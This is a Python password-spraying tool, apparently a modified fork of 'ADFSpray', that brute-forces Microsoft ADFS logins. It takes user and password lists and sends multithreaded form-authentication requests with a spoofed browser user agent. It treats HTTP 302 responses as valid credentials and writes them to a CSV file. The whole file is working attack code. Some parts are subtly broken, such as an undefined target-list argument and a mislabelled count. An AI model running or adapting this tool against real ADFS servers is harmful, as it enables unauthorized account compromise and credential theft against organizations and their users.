#!/usr/bin/env python3
# modified by d.savitski
# - only ADFS brute left
# - multithread support
#
# Python3 tool to perform password spraying attack against ADFS
# by @xFreed0m

import argparse
import csv
import datetime
import logging
import sys
import time
import urllib
import urllib.parse
import urllib.request
from random import randint
from multiprocessing.pool import ThreadPool

import requests
from colorlog import ColoredFormatter
from requests.packages.urllib3.exceptions import InsecureRequestWarning, TimeoutError
from requests_ntlm import HttpNtlmAuth

threads = 1
target = None
output_file_name = None
verbose = None

def logo():
    """
        ___    ____  ___________
       /   |  / __ \/ ____/ ___/____  _________ ___  __
      / /| | / / / / /_   \__ \/ __ \/ ___/ __ `/ / / /
     / ___ |/ /_/ / __/  ___/ / /_/ / /  / /_/ / /_/ /
    /_/  |_/_____/_/    /____/ .___/_/   \__,_/\__, /
                            /_/               /____/
    \n
    By @x_Freed0m\n
    [!!!] Remember! This tool is reliable as much as the target authentication response is reliable.\n
    Therefore, false-positive will happen more often that we would like.
    """


def args_parse():
    parser = argparse.ArgumentParser()
    pass_group = parser.add_mutually_exclusive_group(required=True)
    user_group = parser.add_mutually_exclusive_group(required=True)
    user_group.add_argument('-U', '--userlist', help="emails list to use, one email per line")
    user_group.add_argument('-u', '--user', help="Single email to test")
    pass_group.add_argument('-p', '--password', help="Single password to test")
    pass_group.add_argument('-P', '--passwordlist', help="Password list to test, one password per line")
    parser.add_argument('-t', '--target', help="Target server to authenticate against")
    parser.add_argument('-o', '--output', help="Output each attempt result to a csv file",
                        default="ADFSpray")

    parser.add_argument('-V', '--verbose', help="Turn on verbosity to show failed "
                                                "attempts", action="store_true", default=False)
    parser.add_argument('--threads', type=int, help="Number of threads", default=1)
    return parser.parse_args()


def configure_logger(verbose):  # This function is responsible to configure logging object.

    global LOGGER
    LOGGER = logging.getLogger("ADFSpray")
    # Set logging level
    try:
        if verbose:
            LOGGER.setLevel(logging.DEBUG)
        else:
            LOGGER.setLevel(logging.INFO)
    except Exception as logger_err:
        excptn(logger_err)

    # Create console handler
    log_colors = {
        'DEBUG': 'bold_red',
        'INFO': 'green',
        'WARNING': 'yellow',
        'ERROR': 'red',
        'CRITICAL': 'red',
    }
    formatter = "%(log_color)s[%(asctime)s] - %(message)s%(reset)s"
    formatter = ColoredFormatter(formatter, datefmt='%d-%m-%Y %H:%M', log_colors=log_colors)
    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(formatter)
    LOGGER.addHandler(ch)

    # Create log-file handler
    log_filename = "ADFSpray." + datetime.datetime.now().strftime('%d-%m-%Y') + '.log'
    fh = logging.FileHandler(filename=log_filename, mode='a')
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(formatter)
    LOGGER.addHandler(fh)


def excptn(e):
    LOGGER.critical("[!]Exception: " + str(e))
    exit(1)


def userlist(incoming_userlist):  # Creating an array out of the users file
    with open(incoming_userlist) as f:
        usernames = f.readlines()
    generated_usernames_stripped = [incoming_userlist.strip() for incoming_userlist in usernames]
    return generated_usernames_stripped


def passwordlist(incoming_passwordlist):  # Creating an array out of the passwords file
    with open(incoming_passwordlist) as pass_obj:
        return [p.strip() for p in pass_obj.readlines()]


def targetlist(incoming_targetlist):  # Creating an array out of the targets file
    with open(incoming_targetlist) as target_obj:
        return [p.strip() for p in target_obj.readlines()]


def output(status, username, password, target, output_file_name):
    #  creating a CSV file to log the attempts
    try:
        with open(output_file_name + ".csv", mode='a') as log_file:
            creds_writer = csv.writer(log_file, delimiter=',', quotechar='"')
            creds_writer.writerow([status, username, password, target])
    except Exception as output_err:
        excptn(output_err)


def adfs_attempts(users, passes):
    global threads, output_file_name, verbose


    LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
    output('Status', 'Username', 'Password', 'Target', output_file_name)  # creating the 1st line in the output file
    combinations = []
    for password in passes:
        for username in users:
            combinations.append((username, password))
        
    results = ThreadPool(threads).map(adfs_brute, combinations)
    for result in results:
        pass

    LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))


def adfs_brute(args):
    (username, password) = args
    global threads, target, output_file_name, verbose
    try:
        target_url = "%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%%3afederation" \
            "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
        post_data = urllib.parse.urlencode({'UserName': username, 'Password': password, 'AuthMethod': 'FormsAuthentication'}).encode('ascii')
        session = requests.Session()
        session.auth = (username, password)
        response = session.post(target_url, data=post_data, allow_redirects=False,
        headers={'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) '
                'Gecko/20100101 Firefox/65.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
                'image/webp,*/*;q=0.8'})
        status_code = response.status_code


        if status_code == 302:
            status = 'Valid creds'
            output(status, username, password, target, output_file_name)
            LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
        else:
            status = 'Invalid'
            if verbose:
                output(status, username, password, target, output_file_name)
                LOGGER.debug("[-]Creds failed for: %s" % username)

    except TimeoutError:
        LOGGER.critical("[!] Exceprion")
        pass

    except KeyboardInterrupt:
        LOGGER.critical("[CTRL+C] Stopping the tool")
        exit(1)

    except Exception as e:
        LOGGER.critical("[!]Exception: " + str(e))
        pass




def main():
    global threads, target, output_file_name, verbose

    logo()
    args = args_parse()
    random = False
    min_sleep, max_sleep = 0, 0
    usernames_stripped, passwords_stripped, targets_stripped = [], [], []
    configure_logger(args.verbose)

    if args.userlist:
        try:
            usernames_stripped = userlist(args.userlist)
        except Exception as err:
            excptn(err)
    elif args.user:
        try:
            usernames_stripped = [args.user]
        except Exception as err:
            excptn(err)
    if args.password:
        try:
            passwords_stripped = [args.password]
        except Exception as err:
            excptn(err)
    elif args.passwordlist:
        try:
            passwords_stripped = passwordlist(args.passwordlist)
        except Exception as err:
            excptn(err)
    if args.target:
        try:
            targets_stripped = args.target
        except Exception as err:
            excptn(err)
    elif args.targetlist:
        try:
            targets_stripped = targetlist(args.targetlist)
        except Exception as err:
            excptn(err)

    total_accounts = len(usernames_stripped)
    total_passwords = len(passwords_stripped)
    total_targets = len(targets_stripped)
    total_attempts = total_accounts * total_passwords * total_targets
    LOGGER.info("Total number of users to test: %s" % str(total_accounts))
    LOGGER.info("Total number of passwords to test: %s" % str(total_passwords))
    LOGGER.info("Total number of targets to test: %s" % str(total_passwords))
    LOGGER.info("Total number of attempts: %s" % str(total_attempts))

    threads = args.threads
    output_file_name = args.output
    target = targets_stripped
    verbose = args.verbose

    adfs_attempts(usernames_stripped, passwords_stripped)


if __name__ == "__main__":
    main()


